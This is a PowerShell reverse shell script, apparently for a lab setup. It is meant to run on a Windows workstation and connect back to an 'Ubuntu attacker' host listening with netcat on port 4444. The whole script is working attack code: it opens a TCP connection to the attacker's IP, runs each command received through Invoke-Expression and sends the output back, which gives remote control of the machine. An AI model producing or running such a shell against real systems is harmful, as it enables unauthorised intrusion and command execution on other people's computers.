# Run on the Windows workstation.
# Connects back to the Ubuntu attacker with rlwrap nc -lvnp 4444.

# >>> EDIT THESE <<<
$AttackerIP = "YOUR_UBUNTU_IP"  # <--- CHANGE THIS to your Ubuntu IP (e.g., "192.168.1.50")
$Port       = 4444

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($AttackerIP, $Port)
    
    $stream = $client.GetStream()
    # Fix: Use -ArgumentList to pass the stream correctly
    $reader = New-Object System.IO.StreamReader -ArgumentList $stream
    $writer = New-Object System.IO.StreamWriter -ArgumentList $stream
    $writer.AutoFlush = $true

    # Send initial prompt
    $writer.WriteLine("PS> ")

    while ($client.Connected) {
        try {
            # Read command from attacker
            $cmd = $reader.ReadLine()
            
            if ($null -eq $cmd -or $cmd -eq "exit") { break }

            # Execute command
            try   { $output = Invoke-Expression $cmd 2>&1 | Out-String }
            catch { $output = "ERROR: $_" }

            # Send output back
            $writer.WriteLine($output)
            $writer.WriteLine("PS> ")
        }
        catch {
            # If the connection drops (e.g., reader.ReadLine fails), break the loop
            break
        }
    }
}
catch {
    Write-Host "Connection failed: $_"
}
finally {
    if ($client) { $client.Close() }
}